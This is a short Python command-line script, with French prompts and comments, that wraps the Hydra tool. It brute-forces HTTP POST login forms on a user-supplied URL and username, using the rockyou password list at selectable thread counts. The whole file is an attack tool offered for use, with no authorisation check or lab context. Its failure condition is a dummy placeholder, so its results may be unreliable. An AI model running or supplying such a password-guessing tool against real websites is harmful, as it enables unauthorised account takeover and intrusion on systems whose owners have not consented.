import subprocess

def run_web_attack(url, username, username_field, intensity):
    levels = {
        "faible": 1,
        "moyen": 4,
        "grand": 8
    }

    if intensity not in levels:
        print("❌ Niveau invalide. Choisis entre: faible, moyen, grand.")
        return

    threads = levels[intensity]
    rockyou_path = "/usr/share/wordlists/rockyou.txt"

    # Extraire le domaine et le chemin
    domain = url.replace("http://", "").replace("https://", "").split("/")[0]
    path = "/" + "/".join(url.split("/")[3:])

    # Champ de détection d'échec (obligatoire pour hydra, même factice)
    fail_condition = "F=1"

    # Format final pour http-post-form
    web_target = f"{path}:{username_field}={username}&password=^PASS^:{fail_condition}"

    # Commande hydra
    command = [
        "hydra",
        "-l", username,
        "-P", rockyou_path,
        "-t", str(threads),
        domain,
        "http-post-form", web_target
    ]

    print(f"\n[+] Lancement de l'attaque sur {url} avec {threads} threads...\n")
    print("Commande Hydra :\n" + " ".join(command) + "\n")

    try:
        # Affichage du résultat en temps réel
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        for line in process.stdout:
            print(line, end='')

    except FileNotFoundError:
        print("[!] Hydra n'est pas installé ou introuvable.")
    except Exception as e:
        print(f"[!] Erreur inconnue : {e}")

# Interface CLI
if __name__ == "__main__":
    print("=== HYDRA FORCE BRUTE (http-post-form) ===\n")

    url = input("URL complète de la cible (ex: http://example.com/login.php): ").strip()
    username_field = input("Nom du champ pour le login (ex: username ou email): ").strip()
    username = input("Nom d'utilisateur à tester : ").strip()
    niveau = input("Niveau d'intensité (faible / moyen / grand) : ").strip().lower()

    run_web_attack(url, username, username_field, niveau)
